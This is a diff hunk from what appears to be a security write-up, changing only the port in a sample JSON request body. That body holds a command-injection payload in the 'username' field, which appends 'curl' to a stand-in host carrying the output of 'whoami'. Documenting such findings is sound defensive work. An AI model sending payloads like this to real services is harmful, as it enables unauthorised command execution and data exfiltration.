@@ -131,7 +131,7 @@ We crafted the following JSON body, targeting the `username` field:
 
 ```json
 {
-    "username": "my_target; curl http://fakedomain.local:8000/$(whoami)"
+    "username": "my_target; curl http://fakedomain.local:8001/$(whoami)"
 }
 ```
 
